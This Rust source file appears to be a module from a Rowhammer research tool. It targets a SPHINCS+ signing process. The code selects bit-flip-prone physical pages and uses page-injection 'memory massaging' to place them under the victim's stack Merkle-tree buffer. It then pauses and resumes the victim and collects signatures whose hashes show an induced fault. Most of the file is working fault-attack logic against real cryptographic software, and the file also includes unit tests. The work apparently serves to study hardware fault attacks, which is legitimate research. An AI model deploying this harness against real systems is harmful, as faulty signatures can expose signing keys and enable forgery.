use itertools::Itertools;
use libc::sched_getcpu;
use serde::Serialize;
use sha2::{Digest, Sha256};
use std::{
    collections::HashMap,
    io::{BufRead, BufReader},
    process::ChildStdout,
    thread,
    time::Duration,
};

use crate::{
    memory::{find_flippy_page, BitFlip, FlipDirection, PfnResolver, PhysAddr},
    util::PAGE_SIZE,
};

use super::{HammerVictim, HammerVictimError, InjectionConfig, PageInjector, VictimResult};

#[derive(Serialize)]
enum State {
    Init {
        binary: String,
        injection_config: InjectionConfig,
    },
    Running {
        target: String,
        #[serde(skip_serializing)]
        child: std::process::Child,
        #[serde(skip_serializing)]
        stdout_thread: Option<thread::JoinHandle<(Vec<String>, ChildStdout)>>,
        #[serde(skip_serializing)]
        stderr_logger: Option<thread::JoinHandle<()>>,
        target_pfn: PhysAddr,
        injection_config: InjectionConfig,
    },
    Stopped,
}

#[derive(Serialize)]
pub struct SphincsPlus {
    state: State,
}

impl SphincsPlus {
    pub fn target_addr(&self) -> *const libc::c_void {
        match &self.state {
            State::Init {
                injection_config, ..
            } => injection_config.target_addr as *const libc::c_void,
            _ => panic!("Invalid state"),
        }
    }
}

fn set_process_affinity(pid: libc::pid_t, core_id: usize) {
    use libc::{cpu_set_t, sched_setaffinity, CPU_SET, CPU_ZERO};

    unsafe {
        let mut cpuset: cpu_set_t = std::mem::zeroed();
        CPU_ZERO(&mut cpuset);
        CPU_SET(core_id, &mut cpuset);

        let result = sched_setaffinity(pid, std::mem::size_of::<cpu_set_t>(), &cpuset);
        if result != 0 {
            eprintln!(
                "Failed to set process affinity: {}",
                std::io::Error::last_os_error()
            );
        }
    }
}

fn get_current_core() -> usize {
    unsafe {
        let core_id = sched_getcpu();
        if core_id < 0 {
            panic!(
                "Failed to get current core: {}",
                std::io::Error::last_os_error()
            );
        } else {
            core_id as usize
        }
    }
}

#[derive(Debug, Serialize)]
pub struct StackProcessHammerResult {
    pipe_response: String,
    pub signatures: Vec<String>,
}

const KEYS_FILE: &str = "keys.txt";

// find profile entry with bitflips in needed range
#[derive(Clone, Debug, Serialize)]
pub struct TargetOffset {
    description: &'static str,
    pub page_offset: usize,
    stack_offset: usize,
    pub target_size: usize,
    pub flip_direction: FlipDirection,
}

fn filter_addrs(flips: Vec<BitFlip>, targets: &[TargetOffset]) -> Vec<(usize, TargetOffset)> {
    flips
        .into_iter()
        .filter_map(|flip| {
            let flipped_bits = flip.data & flip.bitmask;
            let addr = flip.addr;
            let pg_offset = addr & 0xfff;
            let matched = targets.iter().find(|&target| {
                let direction_match = match target.flip_direction {
                    FlipDirection::ZeroToOne => flipped_bits == 0,
                    FlipDirection::OneToZero => flipped_bits == flip.bitmask,
                    FlipDirection::Any => true,
                    FlipDirection::None | FlipDirection::Multiple(_) => unimplemented!(),
                };
                let addr = target.page_offset & 0xfff;
                direction_match && addr <= pg_offset && pg_offset < addr + target.target_size
            });
            if matched.is_some() {
                info!("Matched addr {:?} to target {:?}", addr, matched);
            }
            matched.map(|offset| (addr, offset.clone()))
        })
        .collect_vec()
}

const _TARGET_OFFSETS_ANY: [TargetOffset; 1] = [TargetOffset {
    description: "any",
    page_offset: 0,
    stack_offset: 31,
    target_size: 0x1000,
    flip_direction: FlipDirection::Any,
}];

// Target offsets for shake-256s WITH memutils printing enabled
pub const TARGET_OFFSETS_SHAKE_256S: [TargetOffset; 1] = [
    TargetOffset {
        description: "stack merkle tree layer 0",
        page_offset: 0x930,
        stack_offset: 31,
        target_size: 32, // SPX_N
        flip_direction: FlipDirection::OneToZero,
    },
    /*TargetOffset {
        description: "leaf_addr",
        page_offset: 0xc88,
        stack_offset: 31,
        target_size: 22,
    },
    TargetOffset {
        description: "pk_addr",
        page_offset: 0xca8,
        stack_offset: 31,
        target_size: 22,
    },*/
];

fn find_injectable_page(flips: Vec<BitFlip>) -> Option<InjectionConfig> {
    // the number of bait pages to release after the target page (for memory massaging)
    let bait_count_after = HashMap::from([(29, 0), (30, 26), (31, 7), (32, 28)]);

    filter_addrs(flips, &TARGET_OFFSETS_SHAKE_256S)
        .first()
        .map(|f| InjectionConfig {
            target_addr: f.0,
            flippy_page_size: PAGE_SIZE,
            bait_count_after: bait_count_after
                .get(&f.1.stack_offset)
                .copied()
                .expect("unsupported stack offset"),
            bait_count_before: 0,
            stack_offset: f.1.stack_offset,
        })
}

impl SphincsPlus {
    /// Create a new `SphincsPlus` victim.
    ///
    /// # Arguments
    /// - `binary`: The path to the target binary.
    /// - `keys_path`: The path to the keys.
    /// - `sigs_path`: The output path to the signatures.
    /// - `injection_config`: The injection configuration.
    pub fn new(binary: String, flips: Vec<BitFlip>) -> anyhow::Result<Self> {
        let injection_config = find_injectable_page(flips)
            .ok_or_else(|| anyhow::anyhow!("No page suitable for injection found"))?;
        Ok(Self {
            state: State::Init {
                binary,
                injection_config,
            },
        })
    }

    pub fn new_with_config(
        binary: String,
        injection_config: InjectionConfig,
    ) -> anyhow::Result<Self> {
        Ok(Self {
            state: State::Init {
                binary,
                injection_config,
            },
        })
    }

    pub fn pid(&self) -> Option<u32> {
        match self.state {
            State::Running { ref child, .. } => Some(child.id()),
            _ => None,
        }
    }
}

pub fn spawn_reader_thread(
    mut pipe: ChildStdout,
) -> thread::JoinHandle<(Vec<String>, ChildStdout)> {
    thread::spawn(move || {
        let reader = BufReader::new(&mut pipe);
        let mut lines = Vec::new();
        let mut prev_empty = false;

        for line in reader.lines() {
            match line {
                Ok(line) => {
                    let next_empty = line.is_empty();
                    if prev_empty && next_empty {
                        debug!("Received two empty lines, stopping");
                        break;
                    }
                    if !next_empty {
                        trace!("Received line: {}", line);
                        lines.push(line);
                    }
                    prev_empty = next_empty;
                    if prev_empty {
                        debug!("Received empty line");
                    }
                }
                Err(e) => {
                    error!("Error reading line from child process: {}", e);
                    break;
                }
            }
        }

        (lines, pipe) // Return both the collected lines and the pipe
    })
}

impl HammerVictim for SphincsPlus {
    fn start(&mut self) -> Result<(), HammerVictimError> {
        match &self.state {
            State::Init {
                binary,
                injection_config,
            } => {
                set_process_affinity(unsafe { libc::getpid() }, get_current_core());
                let mut cmd = std::process::Command::new("taskset");
                cmd.arg("-c").arg(get_current_core().to_string());
                cmd.arg(binary);
                cmd.arg(KEYS_FILE);
                cmd.stdin(std::process::Stdio::piped());
                cmd.stdout(std::process::Stdio::piped());
                cmd.stderr(std::process::Stdio::piped());
                let page_injector = PageInjector::new(*injection_config);
                let target_pfn = (injection_config.target_addr as *const libc::c_void)
                    .pfn()
                    .expect("PFN resolve failed");
                let mut child = page_injector.inject(cmd).expect("Failed to inject page");
                info!("Victim launched");

                // Log victim stderr
                let stderr_logger = if let Some(stderr) = child.stderr.take() {
                    let reader = BufReader::new(stderr);

                    // Spawn a thread to handle logging from stderr
                    let handle = thread::spawn(move || {
                        for line in reader.lines() {
                            match line {
                                Ok(log_line) => {
                                    info!("{}", log_line);
                                }
                                Err(err) => {
                                    error!("Error reading line from child process: {}", err)
                                }
                            }
                        }
                    });
                    Some(handle)
                } else {
                    eprintln!("Failed to capture stderr");
                    child.kill().expect("kill");
                    child.wait().expect("wait");
                    None
                };

                // Pin the child to the next core
                let num_cores = unsafe { libc::sysconf(libc::_SC_NPROCESSORS_ONLN) };
                let target_core = (get_current_core() + 1) % num_cores as usize;
                let cid = child.id();
                info!("Pinning procees {} to core {}", cid, target_core);
                set_process_affinity(cid as libc::pid_t, target_core);

                // Create a pipe for IPC
                let stdout_thread = None; //Some(spawn_reader_thread(child.stdout.take().expect("stdout")));
                self.state = State::Running {
                    target: binary.clone(),
                    child,
                    stdout_thread,
                    stderr_logger,
                    target_pfn,
                    injection_config: *injection_config,
                };

                // find flippy page
                thread::sleep(Duration::from_millis(100)); // wait before checking for flippy page, as victim might need some time to allocate the stack
                if let Err(e) = self.check_flippy_page_exists() {
                    error!("Failed to find flippy page: {:?}", e);
                    Err(e)
                } else {
                    Ok(())
                }
            }
            _ => Err(HammerVictimError::NotRunning),
        }
    }
    fn init(&mut self) {
        match self.state {
            State::Running { ref mut child, .. } => {
                // wait for the victim to enter "SIGSTOP" state
                info!("Waiting for victim to stop");
                loop {
                    debug!("Checking victim state");
                    let stat = lpfs::pid::stat::stat_of(child.id()).expect("stat_of");
                    let state = stat.state();
                    if state.eq_ignore_ascii_case(&'T') {
                        info!("Victim stopped, ready for hammering");
                        break;
                    } else {
                        trace!("Victim not stopped yet: state {:?}", state);
                    }
                    thread::sleep(Duration::from_secs(1));
                }
            }
            _ => panic!("Victim not running"),
        }
    }

    fn check(&mut self) -> Result<VictimResult, HammerVictimError> {
        self.check_flippy_page_exists()?;
        match &mut self.state {
            State::Running { child, .. } => {
                // resume the victim
                info!("Sending SIGCONT to victim");
                unsafe {
                    libc::kill(child.id() as i32, libc::SIGCONT);
                }

                let signature = {
                    let mut stdout = child.stdout.take().expect("stdout");
                    let mut reader = BufReader::new(&mut stdout);
                    let mut signature = String::new();
                    reader.read_line(&mut signature)?;
                    child.stdout = Some(stdout);
                    signature.trim().to_string()
                };
                let expected_sha256 = [
                    "a2dc0903dbbf54dfaeec7475438864b8fa0b22f6fe9d0aa3d91faf5b323abde5", // sphincs+ sig
                    "f3336bea752b5a28743033dd2c844a4a63fba08871aaee2586a2bf2d69be83a2", // dummy "aaaaaa..."
                    "5af53f7370947ba6975447488f7da0420887fdce811d5ce5e1bfe5125d24c977", // dummy "555555..."
                ];
                let mut hasher = Sha256::new();
                hasher.update(signature.as_bytes());
                let result = hasher.finalize();
                let sig_sha256 = hex::encode(result);
                let flipped = !expected_sha256.contains(&sig_sha256.as_str());

                if flipped {
                    Ok(VictimResult::String(signature))
                } else {
                    info!("No flips detected");
                    Err(HammerVictimError::NoFlips)
                }
            }
            _ => Err(HammerVictimError::NotRunning),
        }
    }

    fn stop(&mut self) {
        if let State::Running {
            child,
            stderr_logger,
            ..
        } = &mut self.state
        {
            child.kill().expect("kill");
            child.wait().expect("wait");
            if let Some(stderr_logger) = stderr_logger.take() {
                stderr_logger.join().expect("join");
            }
            self.state = State::Stopped;
        }
    }
}

impl SphincsPlus {
    fn check_flippy_page_exists(&self) -> Result<(), HammerVictimError> {
        if let State::Running {
            child,
            target_pfn,
            injection_config,
            ..
        } = &self.state
        {
            let flippy_page = find_flippy_page(*target_pfn, child.id());
            match flippy_page {
                Ok(Some(flippy_page)) => {
                    info!("Flippy page found: {:?}", flippy_page);
                    if flippy_page.region_offset != injection_config.stack_offset {
                        warn!(
                            "Flippy page offset mismatch: {} != {}",
                            flippy_page.region_offset, injection_config.stack_offset
                        );
                        return Err(HammerVictimError::FlippyPageOffsetMismatch {
                            expected: injection_config.stack_offset,
                            actual: flippy_page,
                        });
                    }
                    return Ok(());
                }
                Ok(None) => {
                    return Err(HammerVictimError::FlippyPageNotFound);
                }
                Err(e) => return Err(HammerVictimError::PageMapError(e)),
            }
        }
        Err(HammerVictimError::NotRunning)
    }
}

#[cfg(test)]
mod tests {
    use std::ptr::null_mut;

    use crate::{
        allocator::util::mmap,
        memory::BitFlip,
        util::PAGE_SIZE,
        victim::{
            sphincs_plus::{self, filter_addrs, TargetOffset},
            HammerVictim,
        },
    };

    #[test]
    fn test_sphincs_plus() -> anyhow::Result<()> {
        let ptr = mmap(null_mut(), PAGE_SIZE);
        let flip = BitFlip::new(ptr, 0x1, 0x1);
        let mut stack_process = super::SphincsPlus::new(
            "/home/jb/sphincsplus/ref/test/server".to_string(),
            vec![flip],
        )?;
        for _ in 0..10 {
            stack_process.init();
            let resp = stack_process.check();
            assert!(
                matches!(resp, Err(sphincs_plus::HammerVictimError::NoFlips),),
                "{:?}",
                resp
            );
        }
        Ok(())
    }

    #[test]
    fn test_filter_addrs_match_start() {
        let flip = BitFlip::new(0x700 as *const u8, 0x1, 0x1);
        let targets = [TargetOffset {
            description: "test_filter_flips_match_start",
            page_offset: 0x700,
            stack_offset: 31,
            target_size: 32,
            flip_direction: sphincs_plus::FlipDirection::Any,
        }];
        let filtered = filter_addrs(vec![flip], &targets);
        assert_eq!(filtered.len(), 1);
    }

    #[test]
    fn test_filter_addrs_match_end() {
        let flip = BitFlip::new(0x700 as *const u8, 0x1, 0x1);
        let target = TargetOffset {
            description: "test_filter_flips_match_end",
            page_offset: 0x600,
            stack_offset: 31,
            target_size: 0x101,
            flip_direction: sphincs_plus::FlipDirection::Any,
        };
        let filtered = filter_addrs(vec![flip], &[target]);
        assert_eq!(filtered.len(), 1);
    }

    #[test]
    fn test_filter_addrs_nomatch() {
        let flip = BitFlip::new(0x700 as *const u8, 0x1, 0x1);
        let target = TargetOffset {
            description: "test_filter_flips_nomatch",
            page_offset: 0x600,
            stack_offset: 31,
            target_size: 0x100,
            flip_direction: sphincs_plus::FlipDirection::Any,
        };
        let filtered = filter_addrs(vec![flip], &[target]);
        assert_eq!(filtered.len(), 0);
    }
}
